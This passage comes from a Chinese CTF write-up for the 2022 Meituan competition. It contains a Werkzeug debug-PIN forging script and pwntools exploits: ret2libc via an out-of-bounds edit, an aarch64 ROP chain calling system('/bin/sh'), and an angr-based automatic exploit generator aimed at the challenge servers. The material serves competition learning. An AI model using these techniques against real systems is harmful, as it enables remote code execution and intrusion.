<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;95530260679&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962029821f34fdecf5402e3da60b23c2cfc8a0b98c91124624fa89bfc7f4950ef9f5&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>然后进入直接执行python命令读取flag</p>
<p><img src="/2022/09/MT-CTF-Writeup/NIj_m3ePomvNmqnedYKJqw.png" alt="6"></p>
<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> <strong>PWN</strong></h3>
<h4 id="note"><a class="markdownIt-Anchor" href="#note"></a> <strong>note</strong></h4>
<p>edit存在越界编辑，可以直接ret2libc。</p>
<p><img src="/2022/09/MT-CTF-Writeup/9GVF4sWsMZTpZTzVsU4WCA.png" alt="7"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">r</span>=process(&quot;/home/ubuntu/pwn/比赛/MTCTF/note/note&quot;)</span><br><span class="line"><span class="attribute">r</span>=remote(&quot;39.106.78.22&quot;,35482)</span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;/home/ubuntu/pwn/比赛/MTCTF/note/note&quot;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;amd64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;5. leave&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="attribute">puts_plt</span>=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="attribute">puts_got</span>=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = 0x401150</span><br><span class="line">pop_rdi_ret = 0x00000000004017b3</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line"><span class="built_in">add</span>(0x100,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span><span class="number">*8</span> + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line"><span class="built_in">edit</span>(-4,payload)</span><br><span class="line"><span class="attribute">libc_base</span>=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b<span class="string">&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+libc.search(b<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span><span class="number">*8</span> + p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+p64(system_addr)+p64(start_addr)</span><br><span class="line"><span class="built_in">edit</span>(-4,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="ret2libc_aarch64"><a class="markdownIt-Anchor" href="#ret2libc_aarch64"></a> <strong>ret2libc_aarch64</strong></h4>
<p>异构pwn，可以直接泄露出libc数据，然后直接根据aarch64的调用规则，调用system(“/bin/sh”)。</p>
<p><img src="/2022/09/MT-CTF-Writeup/K5J0v8JuNuVU0KNm3B0IGA.png" alt="8"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;aarch64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = 2</span><br><span class="line"><span class="keyword">if</span> local == 0:</span><br><span class="line">    <span class="attribute">r</span>=process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> local == 1:</span><br><span class="line">    <span class="attribute">r</span>=process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="attribute">r</span>=remote(&quot;39.106.78.22&quot;,16078)</span><br><span class="line"></span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/ubuntu/pwn/arm_pwn/pwn/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">meau(1)</span><br><span class="line"><span class="attribute">setbuf_got</span>=elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">r.send(p64(setbuf_got))</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(b<span class="string">&quot;\n&quot;</span>)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;setbuf&#x27;</span>] + 0x4000000000</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+hex(libc_base))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">bin_sh = libc_base + libc.search(b<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">meau(2)</span><br><span class="line"><span class="attribute">payload</span>=b&#x27;a&#x27;*0x88+p64(libc_base+0x0000000000063e5c)+p64(system_addr)*5+p64(bin_sh)+p64(system_addr)*5</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="捉迷藏"><a class="markdownIt-Anchor" href="#捉迷藏"></a> <strong>捉迷藏</strong></h4>
<p>就是把SCTF的一道自动化题目的一种情况拿了过来，之前的脚本改改就能直接打。</p>
<p><img src="/2022/09/MT-CTF-Writeup/LINGgj13umO_LKwO4910kQ.png" alt="9"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">from</span> angr.sim_options <span class="keyword">import</span> LAZY_SOLVES</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> angr.sim_options <span class="keyword">import</span> ZERO_FILL_UNCONSTRAINED_MEMORY, unicorn</span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> Project, SimProcedure</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NopsFun</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">out_list = []</span><br><span class="line">g_idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fksth</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, a1, a2</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;fksth&#x27;</span>)</span><br><span class="line">        constraints = []</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            v = self.state.memory.load(a2+idx, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.<span class="built_in">eval</span>(v) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            constraints.append(v == self.state.memory.load(a1+idx, <span class="number">1</span>))</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        retval = claripy.If(self.state.solver.And(*constraints), claripy.BVV(<span class="number">0</span>, <span class="number">64</span>), claripy.BVV(<span class="number">1</span>, <span class="number">64</span>))</span><br><span class="line">        <span class="keyword">return</span> retval</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">input_val</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> g_idx</span><br><span class="line">        data1 = claripy.BVS(<span class="string">&#x27;input%x&#x27;</span> %g_idx, <span class="number">32</span>)</span><br><span class="line">        data2 = claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        ret = self.state.solver.Concat(data2, data1)</span><br><span class="line">        out_list.append((g_idx, <span class="string">&#x27;int&#x27;</span>, data1))</span><br><span class="line">        g_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">input_line</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buff, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">global</span> g_idx</span><br><span class="line">        <span class="built_in">len</span>= self.state.solver.<span class="built_in">eval</span>(<span class="built_in">len</span>)</span><br><span class="line">        data = claripy.BVS(<span class="string">&#x27;input%x&#x27;</span> %g_idx, <span class="built_in">len</span>* <span class="number">8</span>)</span><br><span class="line">        out_list.append((g_idx, <span class="string">&#x27;str&#x27;</span>, data))</span><br><span class="line">        g_idx += <span class="number">1</span></span><br><span class="line">        self.state.memory.store(buff, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aeg</span>(<span class="params">binary</span>):</span><br><span class="line">    p = angr.Project(binary, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>, <span class="string">&#x27;load_debug_info&#x27;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="keyword">for</span> symbol <span class="keyword">in</span> p.loader.symbols:</span><br><span class="line">        <span class="comment">#print (symbol.name)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;main&#x27;</span> == symbol.name:</span><br><span class="line">            main_addr = symbol.rebased_addr</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;main=%x\n&#x27;</span> %main_addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;fksth&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            fksth_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;init&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            init_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;input_line&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            input_line_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;input_val&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            input_val_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;backdoor&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            backdoor_addr = symbol.rebased_addr</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;symbol=%s, addr=%x&#x27;</span> %(symbol.name, symbol.rebased_addr))</span><br><span class="line"></span><br><span class="line">    cfg = p.analyses.CFGFast()</span><br><span class="line">    main_func = cfg.kb.functions[main_addr]</span><br><span class="line">    main_block_addrs = main_func.block_addrs</span><br><span class="line">    </span><br><span class="line">    max_disp = -<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> call_site <span class="keyword">in</span> main_func.get_call_sites():</span><br><span class="line">        target = main_func.get_call_target(call_site)</span><br><span class="line">        <span class="keyword">if</span> target == input_line_addr:</span><br><span class="line">            <span class="comment">#拿出对应的input_line代码块</span></span><br><span class="line">            block = p.factory.block(call_site).capstone</span><br><span class="line">            <span class="keyword">for</span> insn <span class="keyword">in</span> block.insns:</span><br><span class="line">                <span class="built_in">print</span> (insn)</span><br><span class="line">                <span class="keyword">if</span> insn.mnemonic == <span class="string">&#x27;lea&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> insn.disp &gt; max_disp:</span><br><span class="line">                        max_disp = insn.disp</span><br><span class="line">                        vul_addr = call_site</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (max_disp)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;addr=%x&#x27;</span> %vul_addr)</span><br><span class="line">    graph = main_func.transition_graph</span><br><span class="line">    <span class="keyword">for</span> block_node <span class="keyword">in</span> graph.nodes:</span><br><span class="line">        <span class="keyword">if</span> (block_node.addr &lt;= vul_addr) &amp; (vul_addr &lt; (block_node.addr+block_node.size)):</span><br><span class="line">            vul_block = block_node</span><br><span class="line">    cur_block = vul_block</span><br><span class="line"></span><br><span class="line">    path = [cur_block.addr]</span><br><span class="line">    <span class="keyword">while</span> cur_block.addr != main_addr:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> graph.predecessors(cur_block):</span><br><span class="line">            cur_block = key</span><br><span class="line">            path = [cur_block.addr] + path</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    void_addrs = []</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> graph.nodes:</span><br><span class="line">        <span class="keyword">if</span> node.addr <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">            <span class="keyword">if</span> node.addr <span class="keyword">in</span> main_block_addrs:</span><br><span class="line">                void_addrs.append(node.addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;-&#x27;</span>.join(<span class="string">&#x27;0x%x&#x27;</span> %p <span class="keyword">for</span> p <span class="keyword">in</span> path))</span><br><span class="line">        </span><br><span class="line">    state = p.factory.blank_state(addr=main_addr, add_options=&#123;LAZY_SOLVES&#125;)</span><br><span class="line">    state.options.add(ZERO_FILL_UNCONSTRAINED_MEMORY)</span><br><span class="line">    state.options.add(LAZY_SOLVES)</span><br><span class="line">    simgr = p.factory.simgr(state)</span><br><span class="line">    print_plt = p.loader.main_object.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    p.hook(print_plt, NopsFun())</span><br><span class="line">    p.hook(fksth_addr, fksth())</span><br><span class="line">    p.hook(init_addr, NopsFun())</span><br><span class="line">    p.hook(input_line_addr, input_line())</span><br><span class="line">    p.hook(input_val_addr, input_val())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_state</span>(<span class="params">simgr</span>):</span><br><span class="line">        <span class="keyword">for</span> state <span class="keyword">in</span> simgr.active:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;pc=%s&#x27;</span> %state.regs.pc)</span><br><span class="line">            <span class="keyword">if</span> state.solver.<span class="built_in">eval</span>(state.regs.pc) <span class="keyword">in</span> void_addrs:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;active&#x27;</span>].remove(state)</span><br><span class="line">            <span class="keyword">if</span> state.solver.<span class="built_in">eval</span>(state.regs.pc) == vul_block.addr:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;found&#x27;</span>)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;found&#x27;</span>].append(state)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;active&#x27;</span>].remove(state)</span><br><span class="line">        <span class="keyword">return</span> simgr</span><br><span class="line"></span><br><span class="line">    simgr.explore(step_func=log_state)</span><br><span class="line">    state = simgr.stashes[<span class="string">&#x27;found&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (idx, <span class="built_in">type</span>, data) <span class="keyword">in</span> out_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;int&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%x: %s&#x27;</span> %(idx, state.solver.<span class="built_in">eval</span>(data)))</span><br><span class="line">            s += <span class="string">b&#x27;%d &#x27;</span> %(state.solver.<span class="built_in">eval</span>(data))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%x: %s&#x27;</span> %(idx, state.solver.<span class="built_in">eval</span>(data, cast_to=<span class="built_in">bytes</span>)))</span><br><span class="line">            s += state.solver.<span class="built_in">eval</span>(data, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        </span><br><span class="line">    s += (-max_disp + <span class="number">8</span>)*<span class="string">b&#x27;a&#x27;</span> + p64(backdoor_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;back_door = &quot;</span> + <span class="built_in">hex</span>(backdoor_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-max_disp = &quot;</span> + <span class="built_in">hex</span>(-max_disp))</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;39.106.76.68&quot;</span>,<span class="number">44064</span>)</span><br><span class="line">r.sendline(aeg(<span class="string">&quot;./pwn&quot;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="mininep1美团决赛ctfwriteup"><a class="markdownIt-Anchor" href="#mininep1美团决赛ctfwriteup"></a> <strong>Mininep1–美团决赛CTF–Writeup</strong></h1>
<h2 id="一-战队信息"><a class="markdownIt-Anchor" href="#一-战队信息"></a> <strong>一、战队信息</strong></h2>
<p>战队名称：Mininep1-1</p>
<p>个人排名：4</p>
<h2 id="二-解题详情"><a class="markdownIt-Anchor" href="#二-解题详情"></a> <strong>二、解题详情</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/xjNAP_qZrZsv3u0Wrp_gOg-166427030055210.png" alt="10"></p>
<h2 id="三-解题过程"><a class="markdownIt-Anchor" href="#三-解题过程"></a> <strong>三、解题过程</strong></h2>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> <strong>Misc</strong></h2>
<h3 id="what_is_that"><a class="markdownIt-Anchor" href="#what_is_that"></a> <strong>What_is_that</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/hQaXdjeI8kdpDiOkGqIXSg.png" alt="11"></p>
<p>qwq手撸flag：</p>
<p>flag{1f576e5e-a0db-4fe2-8678-5ec4d227d41a}</p>
<h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> <strong>Pwn</strong></h2>
<h3 id="heap"><a class="markdownIt-Anchor" href="#heap"></a> <strong>heap</strong></h3>
